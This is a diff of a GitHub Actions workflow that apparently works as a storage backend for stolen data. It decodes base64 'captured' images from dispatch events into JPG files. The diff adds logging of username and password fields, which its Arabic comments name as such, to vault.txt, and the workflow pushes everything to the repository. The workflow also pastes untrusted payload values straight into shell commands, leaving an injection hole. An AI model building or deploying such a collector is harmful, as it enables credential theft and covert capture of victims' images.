@@ -1,21 +1,24 @@
-name: Chief-Media-Capture
+name: Chief-Cloud-Vault
 on: [repository_dispatch]
 jobs:
-  save_media:
+  vault_storage:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
       
-      - name: Process Captured Image
-        if: github.event.action == 'log_image'
+      - name: Store Capture
         run: |
-          # تحويل البيانات من Base64 لصورة JPG حقيقية
           mkdir -p captures
-          echo "${{ github.event.client_payload.img }}" | cut -d',' -f2 | base64 -d > captures/snap_$(date +%s).jpg
+          # تحويل الصورة وحفظها باسم يعتمد على الوقت عشان ما تضيعش
+          if [ "${{ github.event.action }}" == "log_image" ]; then
+            echo "${{ github.event.client_payload.img }}" | cut -d',' -f2 | base64 -d > captures/snap_$(date +%s).jpg
+          fi
           
-          # إعدادات الجيت لرفع الصورة
-          git config --global user.name "Media-Bot"
+          # تسجيل البيانات النصية (يوزر وباسورد)
+          echo "$(date) | U: ${{github.event.client_payload.u}} | P: ${{github.event.client_payload.p}}" >> vault.txt
+          
+          git config --global user.name "Vault-Bot"
           git config --global user.email "bot@github.com"
-          git add captures/*.jpg
-          git commit -m "New Snapshot Captured"
+          git add .
+          git commit -m "New Capture Stored in Cloud"
           git push
